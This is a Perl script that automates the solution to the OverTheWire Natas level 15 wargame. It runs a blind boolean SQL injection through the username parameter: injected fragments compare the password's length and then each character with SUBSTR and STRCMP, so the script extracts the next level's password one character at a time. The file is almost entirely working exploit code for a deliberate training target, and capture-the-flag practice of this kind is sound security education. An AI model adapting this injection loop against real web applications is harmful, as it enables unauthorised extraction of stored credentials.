#!/usr/bin/perl
use strict;
use warnings;
use v5.16.3;

use Carp qw/ confess /;
use URI;
use HTTP::Tiny 0.034;
use Getopt::Long;

my $opts = { wrong => 0 };
GetOptions( $opts, 'wrong!' );

my $host = 'natas15.natas.labs.overthewire.org';
my $uri  = URI->new(sprintf q{http://%s:%s@%s/index.php}, 'natas15', $ARGV[0], $host);
my $u = HTTP::Tiny->new(
    timeout => 5,
    default_headers => { Host => $host },
);

my $password_so_far = '';
local $SIG{INT} = sub { print "\rPassword so far is: $password_so_far\n"; exit; };

sub response_to_boolean {
    my $r = shift;

    if (!$r->{success}) {
        use Data::Dumper;
        confess Dumper {
            response => $r,
            password_so_far => $password_so_far,
        };
    }
    elsif ($r->{content} =~ m/\QThis user exists/) {
        return 1;
    }
    elsif ($r->{content} =~ m/\QThis user doesn't exist/) {
        return;
    }
    else {
        use Data::Dumper;
        confess Dumper {
            response => $r,
            password_so_far => $password_so_far,
        };
    }
}
sub guess_length {
    my $sql_fragment = q{natas16" and length(password) = %d #};

    LENGTH:
    foreach my $i (30..33) {
        $uri->query_form({ debug => 1, username => sprintf($sql_fragment, $i) });
        if ( response_to_boolean( $u->get($uri) ) ) {
            return $i;
        }
        else {
            next LENGTH;
        }
    }
    confess "Couldn't determine length";
}

sub guess_next_char {
    my $pos = shift;
    my $sql_fragment = sub {
        my $sql;
        if ($opts->{wrong}) {
            $sql = <<'WRONG_SQL';
natas16" and STRCMP(
    SUBSTR(password, %d, 1),
    '%s') = 0 #
WRONG_SQL
        }
        else {
            $sql = <<'RIGHT_SQL';
natas16" and STRCMP(
    BINARY(SUBSTR(password, %d, 1)),
    BINARY('%s')) = 0 #
RIGHT_SQL
        }
        chomp $sql;
        return $sql;
    }->();

    CHAR:
    foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
        print "\rGuessing: ${password_so_far}${char}";
        $uri->query_form({ debug => 1, username => sprintf($sql_fragment, $pos, $char) });

        if (response_to_boolean($u->get($uri))) {
            return $char;
        }
        else {
            next CHAR;
        }
    }
    confess "Couldn't guess the next char; password so far is '$password_so_far'";
}

my $length = guess_length();
say "Password length is $length";
foreach my $pos (1 .. $length) {
    STDOUT->autoflush(1);
    $password_so_far .= guess_next_char( $pos );
}

say "\rPassword is '$password_so_far'; double-checking correctness...";

my $sql_fragment = <<'END_SQL_FRAGMENT';
natas16" and STRCMP(BINARY(password), BINARY('%s')) = 0 #
END_SQL_FRAGMENT
chomp($sql_fragment);
$uri->query_form({ debug => 1, username => sprintf($sql_fragment, $password_so_far) });
say response_to_boolean( $u->get($uri) )
    ? "Looks correct"
    : "Looks incorrect, actually";
